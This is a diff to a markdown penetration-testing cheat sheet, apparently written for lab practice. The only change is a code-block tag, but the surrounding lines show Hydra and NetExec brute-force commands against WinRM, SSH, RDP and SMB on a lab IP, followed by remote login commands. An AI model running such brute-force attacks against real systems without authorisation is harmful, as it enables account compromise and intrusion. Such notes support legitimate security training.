@@ -26,7 +26,7 @@ sudo gem install evil-winrm
 WinRM often exposes remote PowerShell access on Windows systems.  
 With valid credentials, [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) provides an interactive session.
 
-```shell-session
+```bash
 # Brute force with NetExec
 netexec winrm 10.129.42.197 -u user.list -p password.list
 
@@ -41,7 +41,7 @@ evil-winrm -i 10.129.42.197 -u user -p password
 SSH is a common brute force target if password authentication is enabled.  
 Hydra can quickly attempt user/pass combinations.
 
-```shell-session
+```bash
 # Brute force SSH with Hydra
 hydra -L user.list -P password.list ssh://10.129.42.197
 
@@ -55,7 +55,7 @@ ssh user@10.129.42.197
 
 RDP brute forcing is slower but can provide full desktop access if successful.  
 
-```shell-session
+```bash
 # Brute force RDP with Hydra
 hydra -L user.list -P password.list rdp://10.129.42.197
 
@@ -69,7 +69,7 @@ xfreerdp /v:10.129.42.197 /u:user /p:password
 
 SMB shares often reveal sensitive data. Weak creds can be brute forced with Hydra or Metasploit.
 
-```shell-session
+```bash
 # Hydra brute force
 hydra -L user.list -P password.list smb://10.129.42.197
 
